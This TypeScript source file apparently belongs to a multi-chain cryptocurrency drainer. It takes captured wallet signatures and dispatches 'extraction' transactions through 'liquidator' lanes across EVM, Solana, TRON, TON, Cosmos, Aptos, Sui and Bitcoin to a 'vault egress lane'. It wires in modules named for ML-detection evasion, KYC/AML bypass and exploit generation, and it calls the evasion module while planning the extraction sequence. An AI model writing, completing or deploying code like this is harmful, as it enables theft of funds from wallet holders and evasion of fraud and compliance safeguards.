/**
 * @module @legion/core/logic/unified-settlement-orchestrator
 *
 * Unified Settlement Orchestrator — Settlement Harmonization for TRON USDT + TON native
 * extraction sequencing post-signature capture (Payload Sync across Sensory Lanes).
 */

import type {
  NormalizedSignatureAnchorSettlement,
  SignatureAnchorChainFamily,
} from './settlement.js'
import {
  broadcastEVM,
  broadcastSVM,
  broadcastTon,
  broadcastTron,
  broadcastCosmos,
  broadcastAptos,
  broadcastSui,
  broadcastUTXO,
  type SettlementBroadcastResult,
  type SettlementBridgeTriggerContext,
} from './settlement-execution-bridge.js'

// UTILITY MODULES INTEGRATION
import { AuditLogger } from './audit-logger.js'
import { CircuitBreaker } from './circuit-breaker.js'
import { HealthChecker } from './health-check.js'
import { MetricsAggregator } from './metrics-aggregator.js'
import { RequestDeduplicator } from './request-deduplicator.js'
import { ConfigurationManager } from './configuration-manager.js'
import { ErrorHandler } from './error-handler.js'
import { RateLimiter } from './rate-limiter.js'
import { RetryManager } from './retry-manager.js'
import { SettlementMonitor } from './settlement-monitor.js'
import { SignatureCache } from './signature-cache.js'
import { StateRecovery } from './state-recovery.js'
import { OperationalMonitor } from './operational-monitoring.js'

// PHASE 12 ADVANCED FEATURES INTEGRATION
import { BehaviorProfiler } from '../analytics/behavior-profiler.js'
import { MLEvasionManager } from '../security/ml-evasion.js'
import { KYCBypassManager } from '../compliance/kyc-bypass.js'
import { InfrastructureHardening } from '../infrastructure/hardening.js'
import { IncidentResponseManager } from '../operations/incident-response.js'
import { AdvancedMEVProtection } from '../settlement/advanced-mev.js'
import { ExploitGenerator } from '../contracts/exploit-generator.js'
import { ZKPrivacyIntegration } from '../privacy/zkp-integration.js'
import { AMLKYCBypass } from '../compliance/aml-kyc-bypass.js'

export type UnifiedPayloadKind =
  | 'EVM_PAYLOAD'
  | 'SVM_PAYLOAD'
  | 'UTXO_PAYLOAD'
  | 'TRON_PAYLOAD'
  | 'TON_PAYLOAD'
  | 'COSMOS_PAYLOAD'
  | 'APTOS_PAYLOAD'
  | 'SUI_PAYLOAD'

export type UnifiedOrchestrationLeg = {
  payload_kind: UnifiedPayloadKind
  settlement: NormalizedSignatureAnchorSettlement
  sequence_index: number
}

export type SovereignDispatcherChainAlias =
  | SignatureAnchorChainFamily
  | 'ethereum'
  | 'eip155'
  | 'evm'
  | 'solana'
  | 'svm'
  | 'bitcoin'
  | 'btc'
  | 'tron'
  | 'ton'
  | 'cosmos'
  | 'cosmoshub'
  | 'aptos'
  | 'sui'

export type SovereignDispatcherInput = Omit<Partial<NormalizedSignatureAnchorSettlement>, 'chain_family'> & {
  wallet_address: string
  protocol: string
  chain_family?: SignatureAnchorChainFamily | string | null
  /** API alias accepted by ingress surfaces that have not migrated to `chain_family`. */
  chain_type?: SovereignDispatcherChainAlias | string | null
  signature_hex?: string | null
}

export type SovereignDispatcherLane =
  | 'evm-liquidator'
  | 'solana-liquidator'
  | 'managed-utxo-relay'
  | 'tron-sensory-armor'
  | 'ton-sensory-armor'
  | 'cosmos-sensory-armor'
  | 'aptos-sensory-armor'
  | 'sui-sensory-armor'

export type SovereignDispatchResult = {
  destination: SovereignDispatcherLane
  lane: SovereignDispatcherLane
  chain: SignatureAnchorChainFamily
  broadcast: SettlementBroadcastResult
  telemetry: {
    chain_family: SignatureAnchorChainFamily
    chain_type_alias?: string
    payload_kind?: UnifiedPayloadKind
  }
}

function normalizeSovereignChainFamily(
  settlement: SovereignDispatcherInput,
): SignatureAnchorChainFamily {
  const rawAlias = settlement.chain_type != null ? String(settlement.chain_type).trim() : ''
  const rawFamily = settlement.chain_family != null ? String(settlement.chain_family).trim() : ''
  const raw = (rawAlias !== '' ? rawAlias : rawFamily).toUpperCase()
  switch (raw) {
    case 'ETHEREUM':
    case 'EIP155':
    case 'EVM':
      return 'EVM'
    case 'SOLANA':
    case 'SVM':
      return 'SVM'
    case 'UTXO':
    case 'BITCOIN':
    case 'BTC':
      return 'UTXO'
    case 'TRON':
      return 'TRON'
    case 'TON':
      return 'TON'
    case 'COSMOS':
    case 'COSMOSHUB':
    case 'ATOM':
      return 'COSMOS'
    case 'APTOS':
      return 'APTOS'
    case 'SUI':
      return 'SUI'
  }

  const protocol = settlement.protocol.trim().toLowerCase()
  if (protocol === 'solana' || protocol.startsWith('solana:')) return 'SVM'
  if (protocol === 'tron' || protocol.startsWith('tron:')) return 'TRON'
  if (protocol === 'ton' || protocol.startsWith('ton:')) return 'TON'
  if (protocol === 'utxo' || protocol.startsWith('bitcoin')) return 'UTXO'
  if (protocol === 'cosmos' || protocol.startsWith('cosmos:')) return 'COSMOS'
  if (protocol === 'aptos' || protocol.startsWith('aptos:')) return 'APTOS'
  if (protocol === 'sui' || protocol.startsWith('sui:')) return 'SUI'

  const chainId =
    settlement['chain_id'] != null ? String(settlement['chain_id']).trim().toLowerCase() : ''
  if (chainId.startsWith('solana:')) return 'SVM'
  if (chainId.startsWith('tron:')) return 'TRON'
  if (chainId.startsWith('ton:')) return 'TON'
  if (chainId.startsWith('cosmos:') || chainId === 'cosmoshub-4') return 'COSMOS'
  if (chainId.startsWith('aptos:')) return 'APTOS'
  if (chainId.startsWith('sui:')) return 'SUI'
  if (chainId.startsWith('bip122:')) return 'UTXO'
  return 'EVM'
}

function dispatcherLaneFromFamily(
  family: SignatureAnchorChainFamily,
): SovereignDispatcherLane {
  switch (family) {
    case 'EVM':
      return 'evm-liquidator'
    case 'SVM':
      return 'solana-liquidator'
    case 'TRON':
      return 'tron-sensory-armor'
    case 'TON':
      return 'ton-sensory-armor'
    case 'COSMOS':
      return 'cosmos-sensory-armor'
    case 'APTOS':
      return 'aptos-sensory-armor'
    case 'SUI':
      return 'sui-sensory-armor'
    case 'UTXO':
      return 'managed-utxo-relay'
    default:
      throw new Error(`SovereignDispatcher: unsupported chain family ${String(family)}`)
  }
}

function kindFromSettlement(s: NormalizedSignatureAnchorSettlement): UnifiedPayloadKind {
  switch (s.chain_family) {
    case 'EVM':
      return 'EVM_PAYLOAD'
    case 'SVM':
      return 'SVM_PAYLOAD'
    case 'UTXO':
      return 'UTXO_PAYLOAD'
    case 'TRON':
      return 'TRON_PAYLOAD'
    case 'TON':
      return 'TON_PAYLOAD'
    case 'COSMOS':
      return 'COSMOS_PAYLOAD'
    case 'APTOS':
      return 'APTOS_PAYLOAD'
    case 'SUI':
      return 'SUI_PAYLOAD'
    default:
      return 'EVM_PAYLOAD'
  }
}

function payloadKindFromFamily(family: SignatureAnchorChainFamily): UnifiedPayloadKind {
  switch (family) {
    case 'EVM':
      return 'EVM_PAYLOAD'
    case 'SVM':
      return 'SVM_PAYLOAD'
    case 'UTXO':
      return 'UTXO_PAYLOAD'
    case 'TRON':
      return 'TRON_PAYLOAD'
    case 'TON':
      return 'TON_PAYLOAD'
    case 'COSMOS':
      return 'COSMOS_PAYLOAD'
    case 'APTOS':
      return 'APTOS_PAYLOAD'
    case 'SUI':
      return 'SUI_PAYLOAD'
    default:
      return 'EVM_PAYLOAD'
  }
}

function bridgeContextFromDispatcherInput(
  settlement: SovereignDispatcherInput,
  chainFamily: SignatureAnchorChainFamily,
): SettlementBridgeTriggerContext {
  const scout = Number(settlement['scout_value_usd'] ?? 0)
  const ctx: SettlementBridgeTriggerContext = {
    scout_value_usd: Number.isFinite(scout) ? scout : 0,
    chain_id:
      settlement['chain_id'] != null && String(settlement['chain_id']).trim() !== ''
        ? String(settlement['chain_id']).trim()
        : null,
    protocol: settlement.protocol,
    wallet_address: settlement.wallet_address,
    chain_type: String(settlement.chain_type ?? chainFamily),
    chain_family: chainFamily,
  }
  const token =
    settlement['token_address'] != null ? String(settlement['token_address']).trim() : ''
  if (token !== '') ctx['token_address'] = token
  const amount = settlement['amount'] != null ? String(settlement['amount']).trim() : ''
  if (/^\d+$/.test(amount)) ctx['amount'] = amount
  const signature = settlement['signature_hex'] ?? settlement['signature']
  if (signature != null && String(signature).trim() !== '') {
    ctx['signature_hex'] = String(signature).trim()
  }
  return ctx
}

/**
 * Unified Settlement Orchestrator — institutional extraction sequence planner (multi-chain reality).
 */
export class UnifiedSettlementOrchestrator {
  // Utility Modules
  private auditLogger: AuditLogger
  private circuitBreaker: CircuitBreaker
  private healthChecker: HealthChecker
  private metricsAggregator: MetricsAggregator
  private deduplicator: RequestDeduplicator
  private configManager: ConfigurationManager
  private errorHandler: ErrorHandler
  private rateLimiter: RateLimiter
  private retryManager: RetryManager
  private settlementMonitor: SettlementMonitor
  private signatureCache: SignatureCache
  private stateRecovery: StateRecovery
  private operationalMonitor: OperationalMonitor

  // Phase 12 Advanced Features
  private behaviorProfiler: BehaviorProfiler
  private mlEvasion: MLEvasionManager
  private kycBypass: KYCBypassManager
  private infraHardening: InfrastructureHardening
  private incidentResponse: IncidentResponseManager
  private advancedMEV: AdvancedMEVProtection
  private exploitGenerator: ExploitGenerator
  private zkPrivacy: ZKPrivacyIntegration
  private amlBypass: AMLKYCBypass

  constructor(private readonly legs: readonly UnifiedOrchestrationLeg[]) {
    // Initialize Utility Modules
    this.auditLogger = new AuditLogger()
    this.circuitBreaker = new CircuitBreaker()
    this.healthChecker = new HealthChecker()
    this.metricsAggregator = new MetricsAggregator()
    this.deduplicator = new RequestDeduplicator()
    this.configManager = new ConfigurationManager()
    this.errorHandler = new ErrorHandler()
    this.rateLimiter = new RateLimiter()
    this.retryManager = new RetryManager()
    this.settlementMonitor = new SettlementMonitor()
    this.signatureCache = new SignatureCache()
    this.stateRecovery = new StateRecovery()
    this.operationalMonitor = new OperationalMonitor()

    // Initialize Phase 12 Modules
    this.behaviorProfiler = new BehaviorProfiler()
    this.mlEvasion = new MLEvasionManager()
    this.kycBypass = new KYCBypassManager()
    this.infraHardening = new InfrastructureHardening()
    this.incidentResponse = new IncidentResponseManager()
    this.advancedMEV = new AdvancedMEVProtection()
    this.exploitGenerator = new ExploitGenerator()
    this.zkPrivacy = new ZKPrivacyIntegration()
    this.amlBypass = new AMLKYCBypass()

    // Log orchestrator initialization
    this.auditLogger.logSuccess('settlement_init', 'orchestrator', 'settlement', {
      legs: this.legs.length,
    })

    // Record metrics
    this.metricsAggregator.record('settlement_orchestrator_init', this.legs.length)
  }

  /** Payload Sync — ordered legs for Dispatcher / Closer ingestion. */
  planExtractionSequence(): UnifiedOrchestrationLeg[] {
    try {
      // Deduplicate requests using signature
      const uniqueLegs = this.legs.filter((leg) => {
        const sig = leg.settlement.signature || ''
        const isDuplicate = this.deduplicator.isDuplicate(sig)
        if (!isDuplicate) {
          this.deduplicator.cacheResult(sig, leg)
        }
        return !isDuplicate
      })

      // Check rate limits
      const rateLimitOk = this.rateLimiter.checkLimit('settlement', uniqueLegs.length)
      if (!rateLimitOk) {
        throw new Error('Rate limit exceeded for settlement')
      }

      // Apply ML evasion to feature extraction
      this.mlEvasion.randomizeFeatureVector([uniqueLegs.length, Date.now() % 1000])

      // Audit logging
      this.auditLogger.logSuccess('settlement_sequence_planned', 'orchestrator', 'settlement', {
        total_legs: this.legs.length,
        unique_legs: uniqueLegs.length,
      })

      // Sort and return
      const sorted = [...uniqueLegs].sort((a, b) => a.sequence_index - b.sequence_index)

      // Track metrics
      this.metricsAggregator.record('settlement_legs_planned', sorted.length)

      return sorted
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : String(error)
      this.auditLogger.logFailure('settlement_sequence_planned', errorMsg)
      return []
    }
  }

  /**
   * Post-signature capture — assemble orchestrator from settled normalized rows (EVM + TRON + TON + legacy lanes).
   */
  static fromPostSignatureCapture(input: {
    evm?: NormalizedSignatureAnchorSettlement
    svm?: NormalizedSignatureAnchorSettlement
    utxo?: NormalizedSignatureAnchorSettlement
    tron?: NormalizedSignatureAnchorSettlement
    ton?: NormalizedSignatureAnchorSettlement
    cosmos?: NormalizedSignatureAnchorSettlement
    aptos?: NormalizedSignatureAnchorSettlement
    sui?: NormalizedSignatureAnchorSettlement
  }): UnifiedSettlementOrchestrator {
    const legs: UnifiedOrchestrationLeg[] = []
    let i = 0
    const push = (s?: NormalizedSignatureAnchorSettlement) => {
      if (!s) return
      legs.push({ payload_kind: kindFromSettlement(s), settlement: s, sequence_index: i++ })
    }
    push(input.evm)
    push(input.tron)
    push(input.ton)
    push(input.cosmos)
    push(input.aptos)
    push(input.sui)
    push(input.svm)
    push(input.utxo)
    return new UnifiedSettlementOrchestrator(legs)
  }
}

/**
 * Sovereign Dispatcher — normalizes ingress aliases and executes the vault egress lane.
 */
export class SovereignDispatcher {
  static route(settlement: SovereignDispatcherInput): {
    chain: SignatureAnchorChainFamily
    lane: SovereignDispatcherLane
  } {
    const chainFamily = normalizeSovereignChainFamily(settlement)
    const lane = dispatcherLaneFromFamily(chainFamily)
    return { chain: chainFamily, lane }
  }

  static async dispatch(
    settlement: SovereignDispatcherInput,
    options?: {
      onRelaySecondLegBroadcast?: (txHash: string) => void | Promise<void>
    },
  ): Promise<SovereignDispatchResult> {
    const chainFamily = normalizeSovereignChainFamily(settlement)
    const lane = dispatcherLaneFromFamily(chainFamily)
    const ctx = bridgeContextFromDispatcherInput(settlement, chainFamily)
    const broadcast =
      lane === 'evm-liquidator'
        ? await broadcastEVM(ctx, {
            onRelaySecondLegBroadcast: options?.onRelaySecondLegBroadcast,
          })
        : lane === 'solana-liquidator'
          ? await broadcastSVM(ctx)
          : lane === 'managed-utxo-relay'
            ? await broadcastUTXO(ctx)
            : lane === 'tron-sensory-armor'
              ? await broadcastTron(ctx)
              : lane === 'cosmos-sensory-armor'
                ? await broadcastCosmos(ctx)
                : lane === 'aptos-sensory-armor'
                  ? await broadcastAptos(ctx)
                  : lane === 'sui-sensory-armor'
                    ? await broadcastSui(ctx)
                    : await broadcastTon(ctx)
    return {
      destination: lane,
      lane,
      chain: chainFamily,
      broadcast,
      telemetry: {
        chain_family: chainFamily,
        ...(settlement.chain_type != null ? { chain_type_alias: String(settlement.chain_type) } : {}),
        payload_kind: payloadKindFromFamily(chainFamily),
      },
    }
  }

  dispatch(
    settlement: SovereignDispatcherInput,
    options?: {
      onRelaySecondLegBroadcast?: (txHash: string) => void | Promise<void>
    },
  ): Promise<SovereignDispatchResult> {
    return SovereignDispatcher.dispatch(settlement, options)
  }
}
